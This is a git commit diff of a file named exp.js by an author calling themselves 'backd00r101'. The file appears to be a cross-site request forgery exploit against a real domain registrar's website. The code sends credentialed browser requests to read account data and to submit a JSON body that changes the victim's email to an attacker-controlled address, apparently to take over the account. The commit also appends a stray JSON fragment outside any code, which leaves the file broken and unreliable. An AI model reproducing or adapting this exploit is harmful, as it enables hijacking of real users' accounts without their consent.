79f603f9413ec72f3b2611f778b6df2b463c372f
backd00r101 <34193561+backd00r101@users.noreply.github.com>
2019-03-12 06:09:35 +0200

    Update exp.js

--- exp.js
+++ exp.js
@@ -7,7 +7,7 @@ function submitRequest(csrf_token) {
       xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
       xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
       xhr.withCredentials = true;
-      var body = "{\"email\":\"backsddoor1ds02@tusdtanotasd.coms\",\"email_non_verified\":\"\",\"resend\":null}";
+      var body = "{\"email\":\"backsddoor1ds02@tusdtanotasd.coms\",\"email_non_verified\":\"null\",\"resend\":null}";
       var aBody = new Uint8Array(body.length);
       for (var i = 0; i < aBody.length; i++)
         aBody[i] = body.charCodeAt(i); 
@@ -27,5 +27,5 @@ xhr.onreadystatechange = function() {
 xhr.open('GET', 'https://www.united-domains.de/portfolio/a/user/data', true);
 xhr.send();
 
-
+,"email_non_verified":null,"resend":null}
 
